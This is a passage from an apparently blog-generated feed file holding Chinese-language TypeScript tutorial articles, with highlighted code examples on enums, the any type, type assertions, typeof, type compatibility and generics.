class="line"><span class="comment">// 枚举</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建枚举</span></span><br><span class="line"><span class="keyword">enum</span> Direction2 &#123;</span><br><span class="line">  Up,</span><br><span class="line">  Down,</span><br><span class="line">  Left,</span><br><span class="line">  Right,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用枚举类型</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeDirection2</span>(<span class="params">direction: Direction2</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(direction);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数时，需要应该传入：枚举 Direction 成员的任意一个</span></span><br><span class="line"><span class="comment">// 类似于 JS 中的对象，直接通过 点（.）语法 访问枚举的成员</span></span><br><span class="line">changeDirection2(Direction2.Up);</span><br></pre></td></tr></table></figure><h4 id="数字枚举"><a href="#数字枚举" class="headerlink" title="数字枚举"></a>数字枚举</h4><ul><li>问题：我们把枚举成员作为了函数的实参，它的值是什么呢?</li><li>解释：通过将鼠标移入 Direction.Up，可以看到枚举成员 Up 的值为 0</li><li>注意：枚举成员是有值的，默认为：从 0 开始自增的数值</li><li>我们把，枚举成员的值为数字的枚举，称为：<code>数字枚举</code></li><li>当然，也可以给枚举中的成员初始化值</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Down -&gt; 11、Left -&gt; 12、Right -&gt; 13</span></span><br><span class="line"><span class="keyword">enum</span> Direction &#123;</span><br><span class="line">  Up = <span class="number">10</span>,</span><br><span class="line">  Down,</span><br><span class="line">  Left,</span><br><span class="line">  Right,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> Direction &#123;</span><br><span class="line">  Up = <span class="number">2</span>,</span><br><span class="line">  Down = <span class="number">4</span>,</span><br><span class="line">  Left = <span class="number">8</span>,</span><br><span class="line">  Right = <span class="number">16</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字符串枚举"><a href="#字符串枚举" class="headerlink" title="字符串枚举"></a>字符串枚举</h4><ul><li>字符串枚举：枚举成员的值是字符串</li><li>注意：字符串枚举没有自增长行为，因此，<strong>字符串枚举的每个成员必须有初始值</strong></li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> Direction &#123;</span><br><span class="line">  Up = <span class="string">'UP'</span>,</span><br><span class="line">  Down = <span class="string">'DOWN'</span>,</span><br><span class="line">  Left = <span class="string">'LEFT'</span>,</span><br><span class="line">  Right = <span class="string">'RIGHT'</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="枚举实现原理"><a href="#枚举实现原理" class="headerlink" title="枚举实现原理"></a>枚举实现原理</h4><ul><li>枚举是 TS 为数不多的非 JavaScript 类型级扩展(不仅仅是类型)的特性之一</li><li>因为：其他类型仅仅被当做类型，而枚举不仅用作类型，还提供值(枚举成员都是有值的)</li><li>也就是说，其他的类型会在编译为 JS 代码时自动移除。但是，<strong>枚举类型会被编译为 JS 代码</strong></li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> Direction &#123;</span><br><span class="line">  Up = <span class="string">'UP'</span>,</span><br><span class="line">  Down = <span class="string">'DOWN'</span>,</span><br><span class="line">  Left = <span class="string">'LEFT'</span>,</span><br><span class="line">  Right = <span class="string">'RIGHT'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会被编译为以下 JS 代码：</span></span><br><span class="line"><span class="keyword">var</span> Direction;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">Direction</span>) </span>&#123;</span><br><span class="line">  Direction[<span class="string">'Up'</span>] = <span class="string">'UP'</span></span><br><span class="line">  Direction[<span class="string">'Down'</span>] = <span class="string">'DOWN'</span></span><br><span class="line">  Direction[<span class="string">'Left'</span>] = <span class="string">'LEFT'</span></span><br><span class="line">  Direction[<span class="string">'Right'</span>] = <span class="string">'RIGHT'</span></span><br><span class="line">&#125;)(Direction || Direction = &#123;&#125;)</span><br></pre></td></tr></table></figure><ul><li>说明：枚举与前面讲到的字面量类型+联合类型组合的功能类似，都用来表示一组明确的可选值列表</li><li>一般情况下，<strong>推荐使用字面量类型+联合类型组合的方式</strong>，因为相比枚举，这种方式更加直观、简洁、高效</li></ul><h3 id="any-类型"><a href="#any-类型" class="headerlink" title="any 类型"></a>any 类型</h3><ul><li><strong>原则:不推荐使用 any</strong>!这会让 TypeScript 变为 “AnyScript”(失去 TS 类型保护的优势)</li><li>因为当值的类型为 any 时，可以对该值进行任意操作，并且不会有代码提示</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj: <span class="built_in">any</span> = &#123; x: <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">obj.bar = <span class="number">100</span>;</span><br><span class="line">obj();</span><br><span class="line"><span class="keyword">const</span> n: <span class="built_in">number</span> = obj;</span><br></pre></td></tr></table></figure><ul><li>解释:以上操作都不会有任何类型错误提示，即使可能存在错误</li><li>尽可能的避免使用 any 类型，除非临时使用 any 来“避免”书写很长、很复杂的类型</li><li>其他隐式具有 any 类型的情况<ol><li>声明变量不提供类型也不提供默认值</li><li>函数参数不加类型</li></ol></li><li>注意：因为不推荐使用 any，所以，这两种情况下都应该提供类型</li></ul><p>在项目开发中，尽量少用 any 类型</p><hr><h3 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h3><p>有时候你会比 TS 更加明确一个值的类型，此时，可以使用类型断言来指定更具体的类型。 比如，</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> aLink = <span class="built_in">document</span>.getElementById(<span class="string">'link'</span>);</span><br></pre></td></tr></table></figure><ul><li>注意：该方法返回值的类型是 HTMLElement，该类型只包含所有标签公共的属性或方法，不包含 a 标签特有的 href 等属性</li><li>因此，这个<strong>类型太宽泛(不具体)</strong>，无法操作 href 等 a 标签特有的属性或方法</li><li>解决方式：这种情况下就需要<strong>使用类型断言指定更加具体的类型</strong></li><li>使用类型断言：</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> aLink = <span class="built_in">document</span>.getElementById(<span class="string">'link'</span>) <span class="keyword">as</span> HTMLAnchorElement;</span><br></pre></td></tr></table></figure><ul><li>解释:<ol><li>使用 <code>as</code> 关键字实现类型断言</li><li>关键字 as 后面的类型是一个更加具体的类型（HTMLAnchorElement 是 HTMLElement 的子类型）</li><li>通过类型断言，aLink 的类型变得更加具体，这样就可以访问 a 标签特有的属性或方法了</li></ol></li><li>另一种语法，使用 <code>&lt;&gt;</code> 语法，这种语法形式不常用知道即可:</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 该语法，知道即可：在react的jsx中使用会报错</span></span><br><span class="line"><span class="keyword">const</span> aLink = &lt;HTMLAnchorElement&gt;<span class="built_in">document</span>.getElementById(<span class="string">'link'</span>);</span><br></pre></td></tr></table></figure><p><em>技巧：在浏览器控制台，通过 <code>__proto__</code> 获取 DOM 元素的类型</em></p><h3 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h3><ul><li>众所周知，JS 中提供了 typeof 操作符，用来在 JS 中获取数据的类型</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="string">'Hello world'</span>); <span class="comment">// string</span></span><br></pre></td></tr></table></figure><ul><li>实际上，TS 也提供了 typeof 操作符：可以在<em>类型上下文</em>中引用变量或属性的类型（类型查询）</li><li>使用场景:根据已有变量的值，获取该值的类型，来简化类型书写</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = &#123; x: <span class="number">1</span>, y: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatPoint</span>(<span class="params">point: &#123; x: <span class="built_in">number</span>; y: <span class="built_in">number</span> &#125;</span>) </span>&#123;&#125;</span><br><span class="line">formatPoint(p);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatPoint</span>(<span class="params">point: <span class="keyword">typeof</span> p</span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>解释:<ol><li>使用 <code>typeof</code> 操作符来获取变量 p 的类型，结果与第一种（对象字面量形式的类型）相同</li><li>typeof 出现在<strong>类型注解的位置（参数名称的冒号后面）所处的环境就在类型上下文</strong>(区别于 JS 代码)</li><li>注意：typeof 只能用来查询变量或属性的类型，无法查询其他形式的类型（比如，函数调用的类型）</li></ol></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;TypeScript-常用类型&quot;&gt;&lt;a href=&quot;#TypeScript-常用类型&quot; class=&quot;headerlink&quot; title=&quot;TypeScript 常用类型&quot;&gt;&lt;/a&gt;TypeScript 常用类型&lt;/h1&gt;&lt;p&gt;TypeScript 是 JS 的超
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="TypeScript" scheme="//www.shen.ee/tags/TypeScript/"/>
    
      <category term="TypeScript常用类型" scheme="//www.shen.ee/tags/TypeScript%E5%B8%B8%E7%94%A8%E7%B1%BB%E5%9E%8B/"/>
    
      <category term="ts" scheme="//www.shen.ee/tags/ts/"/>
    
  </entry>
  
  <entry>
    <title>TypeScript 高级类型</title>
    <link href="//www.shen.ee/article/5963.html"/>
    <id>//www.shen.ee/article/5963.html</id>
    <published>2022-06-16T04:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TypeScript-高级类型"><a href="#TypeScript-高级类型" class="headerlink" title="TypeScript 高级类型"></a>TypeScript 高级类型</h1><h2 id="TS-中的类型兼容性"><a href="#TS-中的类型兼容性" class="headerlink" title="TS 中的类型兼容性"></a>TS 中的类型兼容性</h2><p><a href="https://www.typescriptlang.org/docs/handbook/type-compatibility.html" target="_blank" rel="noopener">TS 类型兼容性参考文档</a></p><p>两种类型系统：1 <strong>Structural Type System(结构化类型系统)</strong> 2 Nominal Type System(标明类型系统)</p><p><strong>TS 采用的是结构化类型系统，也叫做 duck typing(鸭子类型)，类型检查关注的是值所具有的形状</strong></p><p>也就是说，在结构类型系统中，如果两个对象具有相同的形状，则认为它们属于同一类型。比如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Point &#123;</span><br><span class="line">  x: <span class="built_in">number</span>;</span><br><span class="line">  y: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Point2D &#123;</span><br><span class="line">  x: <span class="built_in">number</span>;</span><br><span class="line">  y: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p2: Point2D = &#123;</span><br><span class="line">  x: <span class="number">1</span>,</span><br><span class="line">  y: <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 不会报错</span></span><br><span class="line"><span class="keyword">let</span> p: Point = p2;</span><br></pre></td></tr></table></figure><p>对于对象类型来说，y 的成员至少与 x 相同，则 x 兼容 y（<strong>成员多的可以赋值给少的</strong>，或者说：只要满足必须的类型就行，多了也没事）</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Point2D &#123;</span><br><span class="line">  x: <span class="built_in">number</span>;</span><br><span class="line">  y: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Point3D &#123;</span><br><span class="line">  x: <span class="built_in">number</span>;</span><br><span class="line">  y: <span class="built_in">number</span>;</span><br><span class="line">  z: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p3: Point3D = &#123;</span><br><span class="line">  x: <span class="number">1</span>,</span><br><span class="line">  y: <span class="number">2</span>,</span><br><span class="line">  z: <span class="number">3</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 不会报错</span></span><br><span class="line"><span class="keyword">let</span> p2: Point2D = p3;</span><br></pre></td></tr></table></figure><p>函数类型的类型兼容性比较复杂，需要考虑：1 参数个数 2 返回值类型 等等</p><ol><li><p>参数个数：参数多的兼容参数少的(或者说，参数少的可以赋值给多的)</p><ul><li><strong>在 JS 中省略用不到的函数参数实际上是很常见的，这样的使用方式，促成了 TS 中函数类型之间的兼容性</strong></li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line"><span class="comment">// arr.forEach 第一个参数的类型为： (value: string, index: number, array: string[]) =&gt; void</span></span><br><span class="line">arr.forEach(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;);</span><br><span class="line">arr.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;&#125;);</span><br><span class="line">arr.forEach(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> F1 = <span class="function">(<span class="params">a: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line"><span class="keyword">type</span> F2 = <span class="function">(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确：参数少的可以赋值给参数多的</span></span><br><span class="line"><span class="keyword">let</span> f1: F1 = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> f2: F2 = f1;</span><br></pre></td></tr></table></figure></li><li><p>返回值类型：只要满足必须的类型要求就行，多了也没事</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> F1 = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line"><span class="keyword">const</span> f1: F1 = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h2 id="泛型概述"><a href="#泛型概述" class="headerlink" title="泛型概述"></a>泛型概述</h2><ul><li><strong>泛型（Generics）可以在保证类型安全前提下，让函数等与多种类型一起工作，从而实现复用</strong>，常用于：函数、接口、class 中</li><li>需求：创建一个 id 函数，传入什么数据就返回该数据本身（也就是说，参数和返回值类型相同）</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比如，该函数传入什么数值，就返回什么数值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>(<span class="params">value: <span class="built_in">number</span></span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// res =&gt; 10</span></span><br><span class="line"><span class="keyword">const</span> res = id(<span class="number">10</span>);</span><br></pre></td></tr></table></figure><ul><li>比如，id(10) 调用以上函数就会直接返回 10 本身。但是，该函数只接收数值类型，无法用于其他类型</li><li>为了能让函数能够接受任意类型的参数，可以将参数类型修改为 any。但是，这样就失去了 TS 的类型保护，类型不安全</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>(<span class="params">value: <span class="built_in">any</span></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这时候，就可以使用<strong>泛型</strong>来实现了</li><li><strong>泛型在保证类型安全(不丢失类型信息)的同时，可以让函数等与多种不同的类型一起工作，灵活可复用</strong></li><li>实际上，在 C# 和 Java 等编程语言中，泛型都是用来实现可复用组件功能的主要工具之一</li></ul><h2 id="泛型函数"><a href="#泛型函数" class="headerlink" title="泛型函数"></a>泛型函数</h2><p>创建泛型函数：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>&lt;<span class="title">Type</span>&gt;(<span class="params">value: Type</span>): <span class="title">Type</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以仅使用一个字母来作为类型变量的名称</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>&lt;<span class="title">T</span>&gt;(<span class="params">value: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li>语法：在函数名称的后面添加 <code>&lt;&gt;</code>（尖括号），<strong>尖括号中添加类型变量</strong>，比如此处的 Type</li><li><strong>类型变量 Type，是一种特殊类型的变量，它处理类型而不是值</strong></li><li><strong>类型变量相当于一个类型容器</strong>，能够捕获用户提供的类型（具体是什么类型由用户调用该函数时指定）</li><li>因为 Type 是类型，因此可以将其作为函数参数和返回值的类型，表示参数和返回值具有相同的类型</li><li>类型变量 Type，可以是任意合法的变量名称</li></ul><p>调用泛型函数：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数参数和返回值类型都为：number</span></span><br><span class="line"><span class="keyword">const</span> num = id&lt;<span class="built_in">number</span>&gt;(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数参数和返回值类型都为：string</span></span><br><span class="line"><span class="keyword">const</span> str = id&lt;<span class="built_in">string</span>&gt;(<span class="string">'a'</span>);</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li>语法：在函数名称的后面添加 <code>&lt;&gt;</code>（尖括号），<strong>尖括号中指定具体的类型</strong>，比如，此处的 number</li><li>当传入类型 number 后，这个类型就会被函数声明时指定的类型变量 Type 捕获到</li><li>此时，Type 的类型就是 number，所以，函数 id 参数和返回值的类型也都是 number</li><li>这样，通过泛型就做到了让 id 函数与多种不同的类型一起工作，<strong>实现了复用的同时保证了类型安全</strong></li></ul><h2 id="简化泛型函数调用"><a href="#简化泛型函数调用" class="headerlink" title="简化泛型函数调用"></a>简化泛型函数调用</h2><p>在调用泛型函数时，<strong>可以省略 <code>&lt;类型&gt;</code> 来简化泛型函数的调用</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 省略 &lt;number&gt; 调用函数</span></span><br><span class="line"><span class="keyword">let</span> num = id(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">let</span> str = id(<span class="string">'a'</span>);</span><br></pre></td></tr></table></figure><p>解释:</p><ul><li>此时，TS 内部会采用一种叫做<strong>类型参数推断</strong>的机制，来根据传入的实参自动推断出类型变量 Type 的类型</li><li>比如，传入实参 10，TS 会自动推断出变量 num 的类型 number，并作为 Type 的类型</li><li>推荐：使用这种简化的方式调用泛型函数，使代码更短，更易于阅读</li><li>说明：<strong>当编译器无法推断类型或者推断的类型不准确时，就需要显式地传入类型参数</strong></li></ul><h2 id="泛型约束"><a href="#泛型约束" class="headerlink" title="泛型约束"></a>泛型约束</h2><p>默认情况下，泛型函数的类型变量 Type 可以代表任意类型，这导致无法访问任何属性</p><p>比如，以下示例代码中想要获取参数的长度：</p><ul><li>因为 Type 可以代表任意类型，无法保证一定存在 length 属性，比如 number 类型就没有 length。因此，无法访问 length 属性</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>&lt;<span class="title">Type</span>&gt;(<span class="params">value: Type</span>): <span class="title">Type</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 注意：此处会报错</span></span><br><span class="line">  <span class="built_in">console</span>.log(value.length);</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">id(<span class="string">'a'</span>);</span><br></pre></td></tr></table></figure><p>此时，就需要<strong>为泛型添加约束来<code>收缩类型</code>（缩窄类型取值范围）</strong></p><p>添加泛型约束收缩类型，主要有以下两种方式：1 指定更加具体的类型 2 添加约束</p><p>首先，我们先来看第一种情况，如何指定更加具体的类型：</p><p>比如，将类型修改为 <code>Type[]</code>(Type 类型的数组)，因为只要是数组就一定存在 length 属性，因此就可以访问了</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>&lt;<span class="title">Type</span>&gt;(<span class="params">value: Type[]</span>): <span class="title">Type</span>[] </span>&#123;</span><br><span class="line">  <span class="comment">// 可以正确访问</span></span><br><span class="line">  <span class="built_in">console</span>.log(value.length);</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="添加泛型约束"><a href="#添加泛型约束" class="headerlink" title="添加泛型约束"></a>添加泛型约束</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个自定义类型</span></span><br><span class="line"><span class="keyword">interface</span> ILength &#123;</span><br><span class="line">  length: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Type extends ILength 添加泛型约束</span></span><br><span class="line"><span class="comment">// 解释：表示传入的类型必须满足 ILength 接口的要求才行，也就是得有一个 number 类型的 length 属性</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">id</span>&lt;<span class="title">Type</span> <span class="title">extends</span> <span class="title">ILength</span>&gt;(<span class="params">value: Type</span>): <span class="title">Type</span> </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value.length);</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释:</p><ul><li>创建描述约束的接口 ILength，该接口要求提供 length 属性</li><li>通过 <code>extends</code> 关键字来为泛型（类型变量）添加约束</li><li>该约束表示：<strong>传入的类型必须具有 length 属性</strong></li><li>注意：传入的实参（比如，数组）只要有 length 属性即可（类型兼容性)</li></ul><h2 id="多个类型变量的泛型"><a href="#多个类型变量的泛型" class="headerlink" title="多个类型变量的泛型"></a>多个类型变量的泛型</h2><p>泛型的类型变量可以有多个，并且<strong>类型变量之间还可以约束</strong>(比如，第二个类型变量受第一个类型变量约束) 比如，创建一个函数来获取对象中属性的值：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getProp</span>&lt;<span class="title">Type</span>, <span class="title">Key</span> <span class="title">extends</span> <span class="title">keyof</span> <span class="title">Type</span>&gt;(<span class="params">obj: Type, key: Key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> obj[key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> person = &#123; name: <span class="string">'jack'</span>, age: <span class="number">18</span> &#125;;</span><br><span class="line">getProp(person, <span class="string">'name'</span>);</span><br></pre></td></tr></table></figure><p>解释:</p><ol><li>添加了第二个类型变量 Key，两个类型变量之间使用 <code>,</code> 逗号分隔。</li><li><strong>keyof 关键字接收一个对象类型，生成其键名称(可能是字符串或数字)的联合类型</strong>。</li><li>本示例中 <code>keyof Type</code> 实际上获取的是 person 对象所有键的联合类型，也就是：<code>&#39;name&#39; | &#39;age&#39;</code></li><li>类型变量 Key 受 Type 约束，可以理解为：Key 只能是 Type 所有键中的任意一个，或者说只能访问对象中存在的属性</li></ol><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Type extends object 表示： Type 应该是一个对象类型，如果不是 对象 类型，就会报错</span></span><br><span class="line"><span class="comment">// 如果要用到 对象 类型，应该用 object ，而不是 Object</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getProperty</span>&lt;<span class="title">Type</span> <span class="title">extends</span> <span class="title">object</span>, <span class="title">Key</span> <span class="title">extends</span> <span class="title">keyof</span> <span class="title">Type</span>&gt;(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  obj: Type,</span></span></span><br><span class="line"><span class="function"><span class="params">  key: Key,</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> obj[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><p>泛型接口：接口也可以配合泛型来使用，以增加其灵活性，增强其复用性</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> IdFunc&lt;Type&gt; &#123;</span><br><span class="line">  id: <span class="function">(<span class="params">value: Type</span>) =&gt;</span> Type;</span><br><span class="line">  ids: <span class="function"><span class="params">()</span> =&gt;</span> Type[];</span><br><span 